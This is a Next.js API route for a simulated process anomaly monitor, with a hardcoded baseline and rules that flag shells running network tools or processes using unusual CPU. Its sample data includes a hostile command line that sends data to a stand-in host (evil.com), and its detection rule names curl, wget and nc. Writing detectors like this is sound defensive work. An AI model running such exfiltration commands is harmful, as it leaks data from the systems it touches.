import { NextResponse } from "next/server";

export const dynamic = "force-dynamic";

// POST /api/behavioral-monitor — behavioral anomaly detection for host processes
// Establishes baselines and flags deviations (web server executing shells, etc.)
// Body: { action: "baseline" | "check", targetUrl?, processes? }
export async function POST(req: Request) {
  const { action, targetUrl, processes } = await req.json().catch(() => ({}));

  try {
    if (action === "baseline") {
      // ── Establish behavioral baseline ────────────────────────────────────
      // In production, this would collect real process data from the target
      // For now, we simulate a baseline profile
      const baseline = {
        target: targetUrl || "default",
        established_at: new Date().toISOString(),
        normal_processes: [
          { name: "nginx", cpu: 2.1, memory: 45, network: "inbound:80,443", file_access: "/var/www/*" },
          { name: "node", cpu: 5.4, memory: 128, network: "outbound:5432", file_access: "/app/*" },
          { name: "postgres", cpu: 1.2, memory: 256, network: "inbound:5432", file_access: "/var/lib/postgresql/*" },
        ],
        allowed_executables: ["/usr/bin/nginx", "/usr/bin/node", "/usr/bin/postgres"],
        allowed_network: ["0.0.0.0:80", "0.0.0.0:443", "127.0.0.1:5432"],
        baseline_metrics: {
          avg_cpu: 8.7,
          avg_memory: 429,
          avg_network_connections: 142,
          avg_disk_io: "2.1 MB/s",
        },
      };

      return NextResponse.json({
        ok: true,
        baseline,
        message: `Baseline established for ${targetUrl || "default target"}. Monitoring ${baseline.normal_processes.length} normal processes.`,
      });
    }

    if (action === "check") {
      // ── Check for behavioral anomalies ───────────────────────────────────
      // Analyze provided processes (or simulate) against baseline
      const checked = processes || [
        { name: "nginx", cpu: 2.3, memory: 48, cmd: "/usr/bin/nginx" },
        { name: "node", cpu: 5.1, memory: 135, cmd: "/usr/bin/node /app/server.js" },
        { name: "sh", cpu: 0.1, memory: 8, cmd: "/bin/sh -c 'curl http://evil.com/exfil'" }, // ← ANOMALY
        { name: "python3", cpu: 45.2, memory: 256, cmd: "/usr/bin/python3 -c 'import socket...'" }, // ← ANOMALY
      ];

      const anomalies: { process: string; anomaly: string; severity: string; detail: string }[] = [];

      // Rule 1: Web server spawning shells
      const shellProcs = checked.filter((p: { name: string; cmd: string }) =>
        ["sh", "bash", "zsh", "dash"].includes(p.name) &&
        (p.cmd?.includes("curl") || p.cmd?.includes("wget") || p.cmd?.includes("nc "))
      );
      for (const p of shellProcs) {
        anomalies.push({
          process: p.name,
          anomaly: "WEB_SERVER_SPAWNED_SHELL",
          severity: "critical",
          detail: `Shell process executing network command: ${p.cmd}. Possible RCE or data exfiltration.`,
        });
      }

      // Rule 2: Unexpected high CPU (crypto mining indicator)
      const highCpu = checked.filter((p: { cpu: number; name: string }) => p.cpu > 40 && !["postgres", "node"].includes(p.name));
      for (const p of highCpu) {
        anomalies.push({
          process: p.name,
          anomaly: "UNEXPECTED_HIGH_CPU",
          severity: "high",
          detail: `Process ${p.name} using ${p.cpu}% CPU — possible crypto miner or runaway process.`,
        });
      }

      // Rule 3: Binary modification (would check file hashes in production)
      // Rule 4: Unauthorized network connections
      // Rule 5: Hidden user creation (would check /etc/passwd)

      return NextResponse.json({
        checked_at: new Date().toISOString(),
        processes_checked: checked.length,
        anomalies_found: anomalies.length,
        anomalies,
        threat_level: anomalies.filter((a) => a.severity === "critical").length > 0 ? "CRITICAL" :
                      anomalies.filter((a) => a.severity === "high").length > 0 ? "ELEVATED" : "NORMAL",
        message: anomalies.length === 0
          ? "✅ No anomalies detected. All processes within baseline."
          : `⚠️ ${anomalies.length} anomaly(ies) detected. ${anomalies.filter((a) => a.severity === "critical").length} critical.`,
      });
    }

    return NextResponse.json({ error: "Unknown action" }, { status: 400 });
  } catch (err) {
    return NextResponse.json({ error: err instanceof Error ? err.message : "Failed" }, { status: 500 });
  }
}

// GET /api/behavioral-monitor — returns monitoring rules
export async function GET() {
  return NextResponse.json({
    rules: [
      { id: 1, name: "WEB_SERVER_SPAWNED_SHELL", severity: "critical", desc: "Web server process spawning shell with network commands" },
      { id: 2, name: "UNEXPECTED_HIGH_CPU", severity: "high", desc: "Unknown process using >40% CPU (possible crypto miner)" },
      { id: 3, name: "BINARY_MODIFICATION", severity: "critical", desc: "System binary modified (hash mismatch)" },
      { id: 4, name: "UNAUTHORIZED_NETWORK", severity: "high", desc: "Process connecting to non-allowlisted IP" },
      { id: 5, name: "HIDDEN_USER_CREATION", severity: "critical", desc: "New user account created outside change window" },
      { id: 6, name: "PERSISTENCE_MECHANISM", severity: "high", desc: "Unusual scheduled task or startup script modified" },
      { id: 7, name: "FILE_INTEGRITY_VIOLATION", severity: "medium", desc: "Configuration file modified outside deployment" },
    ],
  });
}
